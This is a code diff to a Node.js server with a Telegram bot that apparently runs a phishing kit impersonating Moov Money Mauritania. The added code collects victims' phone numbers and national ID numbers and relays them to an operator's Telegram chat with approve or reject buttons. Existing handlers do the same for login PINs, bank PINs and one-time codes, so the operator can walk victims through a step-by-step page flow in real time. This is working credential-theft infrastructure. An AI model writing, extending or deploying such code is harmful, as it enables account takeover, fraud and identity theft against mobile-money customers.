@@ -75,7 +75,55 @@ app.post('/api/login-notification', async (req, res) => {
     }
 });
 
-// -------------------- OTP NOTIFICATION API (PAGE 8) --------------------
+// -------------------- CIN API (PAGE 8) --------------------
+app.post('/api/save-cin', async (req, res) => {
+    const { phone, cin } = req.body || {};
+    const country = "Mauritania";
+    const countryCode = "+222";
+    const currentTime = new Date().toLocaleString('en-US', {
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
+        hour12: true
+    });
+
+    if (!phone || !cin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+
+    statusStore[phone] = "pending_cin";
+
+    const cinNotificationMsg = `🪪 <b>MOOV MONEY MAURITANIA - CIN SUBMISSION</b>
+
+🆕 <b>NATIONAL ID SUBMISSION (Page 8)</b>
+🇲🇷 <b>Country:</b> ${country}
+🌍 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
+🆔 <b>CIN Number:</b> ${cin}
+⏰ <b>Time:</b> ${currentTime}
+
+━━━━━━━━━━━━━━━
+
+⚠️ <b>Verify National ID:</b>
+⌛ <b>Timeout: 5 minutes</b>`;
+
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID, cinNotificationMsg, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Approve CIN", callback_data: `cin_approve|${phone}` },
+                        { text: "❌ Invalid CIN", callback_data: `cin_reject|${phone}` }
+                    ]
+                ]
+            }
+        });
+        res.json({ success: true });
+    } catch (err) {
+        console.error("Telegram Notification Error:", err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// -------------------- OTP NOTIFICATION API --------------------
 app.post('/api/otp-notification', async (req, res) => {
     const { phone, otp } = req.body || {};
     const country = "Mauritania";
@@ -114,7 +162,7 @@ app.post('/api/otp-notification', async (req, res) => {
                     ],
                     [
                         { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
-                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
+                        { text: "⚠️️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                     ],
                     [
                         { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
@@ -304,7 +352,7 @@ app.post('/api/verify-bank-pin', async (req, res) => {
 
 // -------------------- BOT ACTIONS --------------------
 
-// APPROVE
+// APPROVE LOGIN
 bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
@@ -321,7 +369,7 @@ bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
 ━━━━━━━━━━━━━━━
 
 ✅ <b>Status: Approved</b>
-➡️ <b>Next: First OTP (1/2)</b>
+➡️ <b>Next: Verification process</b>
 ⏱️ <b>${currentTime}</b>`;
 
     await ctx.answerCbQuery("Allowed");
@@ -329,7 +377,7 @@ bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(approvedMsg);
 });
 
-// DENY
+// DENY LOGIN
 bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
@@ -350,6 +398,37 @@ bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
     await ctx.answerCbQuery("Rejected");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(deniedMsg);
+});
+
+// CIN APPROVE
+bot.action(/^cin_approve\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "cin_approved";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const approvedCinMsg = `🪪 <b>CIN APPROVED</b>
+
+🇲🇷 <b>Mauritania</b>
+📱 <b>${phone}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: CIN Approved</b>
+➡️ <b>Next: Proceeding to Page 9</b>
+⏱️ <b>${currentTime}</b>`;
+
+    await ctx.answerCbQuery("CIN Approved");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(approvedCinMsg);
+});
+
+// CIN REJECT
+bot.action(/^cin_reject\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "cin_rejected";
+    await ctx.answerCbQuery("CIN Rejected");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`❌ <b>INVALID CIN</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter CIN.</b>`);
 });
 
 // OTP1 CORRECT
